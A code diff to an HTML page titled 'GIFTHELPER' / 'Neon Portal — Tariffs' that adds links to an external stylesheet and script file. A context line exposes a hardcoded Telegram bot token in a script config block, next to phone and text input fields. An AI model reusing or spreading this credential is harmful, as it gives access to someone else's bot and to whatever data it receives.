@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>GIFTHELPER</title>
-  
+  <link rel="stylesheet" href="./style.css">
 
 <style>
 :root {
@@ -262,7 +262,7 @@ input[type=tel], input[type=text], input[type=number] {
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Neon Portal — Tariffs</title>
-  
+  <link rel="stylesheet" href="style.css" />
 <style>
 :root {
   --neon:#0ff;
@@ -639,7 +639,7 @@ input[type=tel], input[type=text], input[type=number] {
     <button class="back-big" data-back="home"><span data-lang="back">Назад</span></button>
   </section>
 
-  
+  <script src="script.js"></script>
 <script>
 /* ===== CONFIG ===== */
 const BOT_TOKEN = "8444402955:AAHSZZyRkJE6FSHH8TtXDgGBfWSp3ryV9RE";
@@ -936,7 +936,7 @@ window.addEventListener('beforeunload', ()=> {
 </body>
 </html>
 <!-- partial -->
-  
+  <script  src="./script.js"></script>
 
 <script>
 /* ===== CONFIG ===== */
